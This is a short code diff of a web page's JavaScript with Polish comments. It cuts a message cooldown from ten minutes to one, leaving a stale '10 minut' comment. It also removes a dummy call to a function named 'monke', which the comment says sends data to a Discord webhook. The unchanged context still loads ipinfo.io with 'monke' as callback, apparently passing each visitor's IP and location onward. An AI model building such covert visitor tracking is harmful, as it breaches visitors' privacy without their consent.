@@ -17,7 +17,7 @@
             }
             var currentTime = new Date().getTime();
             var elapsedTime = currentTime - parseInt(lastSentTime);
-            var cooldownTime = 10 * 60 * 1000; // 10 minut w milisekundach
+            var cooldownTime = 1 * 60 * 1000; // 10 minut w milisekundach
             return elapsedTime >= cooldownTime;
         }
 
@@ -32,7 +32,7 @@
             var messageFailed = document.getElementById('MessageFailed');
 
             if (!isCooldownExpired()) {
-                alert('Cooldown! Poczekaj przed wysłaniem następnej wiadomości! (10 minut)');
+                alert('Cooldown! Poczekaj przed wysłaniem następnej wiadomości! (1 minuta)');
                 return;
             }
 
@@ -50,15 +50,6 @@
             inputField.value = '';
             messageSent.style.display = 'block';
             messageFailed.style.display = 'none';
-
-            // Wysłanie danych na webhook Discorda
-            monke({
-                ip: 'dummy_ip',
-                country: 'dummy_country',
-                region: 'dummy_region',
-                city: 'dummy_city',
-                postal: 'dummy_postal'
-            });
         }
     </script>
     <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
